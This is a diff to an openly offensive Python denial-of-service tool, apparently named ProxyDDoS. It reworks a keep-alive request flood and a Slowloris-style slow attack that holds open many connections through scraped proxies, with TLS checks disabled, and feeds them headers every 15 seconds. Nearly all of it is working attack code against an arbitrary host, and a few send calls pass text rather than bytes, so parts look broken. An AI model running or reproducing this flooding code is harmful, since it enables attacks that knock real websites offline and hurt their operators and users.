@@ -22,6 +22,7 @@ thread_pool = []
 download_proxy = []
 worked_proxy = []
 good_proxies = []
+socket_list = []
 conns = 0
 brute = False
 cdn = False
@@ -330,14 +331,13 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
 def launchThreads():
     for _ in range(thr):
         try:
-            threading.Thread(target=send_requests, daemon=True).start()
+            if "--dsyn" in sys.argv:
+                t = threading.Thread(target=send_dsyn)
+            else:
+                t = threading.Thread(target=send_requests)
+            t.start()
         except:
             pass
-
-
-def launchSLOW():
-    while 1:
-        threading.Thread(target=send_dsyn, daemon=True).start()
 
 
 def send_dsyn():
@@ -348,8 +348,8 @@ def send_dsyn():
         return
     while 1:
         try:
-            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-            s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((host, port))
             if port == 443:
                 context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -357,18 +357,63 @@ def send_dsyn():
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=host)
             try:
-                hd = 0
-                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-Alive\r\nSymbol: ".encode())
-                while 1:
-                    hd += 1
-                    s.send(f"{hd}".encode())
-                    time.sleep(15)
-                    print(f"[ProxyDDoS] Proxy : {proxy_ip} Slow Attack -> {host}")
+                for _ in range(100):
+                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Keep-Alive\r\n\r\n")
+                print(f"[ProxyDDoS] DSYN FLOODING {host} < {proxy_ip}")
             except:
                 s.close()
         except:
-            s.close()                    
-    sema.release()
+            s.close()
+
+
+def launch_slow():
+    try:
+        proxy_ip, proxy_port = random.choice(good_proxies).split(":")
+        proxy_port = int(proxy_port)
+    except ValueError:
+        return
+    try:
+        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+        s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        for _ in range(100):
+            try:
+                s.connect((host, port))
+                if port == 443:
+                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
+                    s = context.wrap_socket(s, server_hostname=host)
+                try:
+                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-Alive\r\n".encode())
+                    socket_list.append(s)
+                except:
+                    s.close()
+            except:
+                s.close()
+        return True
+    except:
+        s.close()
+
+
+def send_slow():
+    for _ in range(thr):
+        t = threading.Thread(target=launch_slow, daemon=True)
+        t.start()
+        t.join()
+    while 1:
+        if len(socket_list) > 0:
+            for s in socket_list:
+                try:
+                    s.send(f"Symbol: {rC(rand)}\r\n")
+                    print(f"{s} SLOW FLOODING")
+                except:
+                    s.close()
+                    socket_list.remove(s)
+                    threading.Thread(target=launch_slow, daemon=True).start()
+            time.sleep(15)
+        else:
+            pass
 
 
 def send_requests(): #傳統HTTP FLOOD
@@ -453,7 +498,7 @@ if __name__ == '__main__':
         f.close()
         launchChecker()
         if "--slow" in sys.argv:
-            launchSLOW()
+            send_slow()
         else:
             launchThreads()
         while not KeyboardInterrupt:
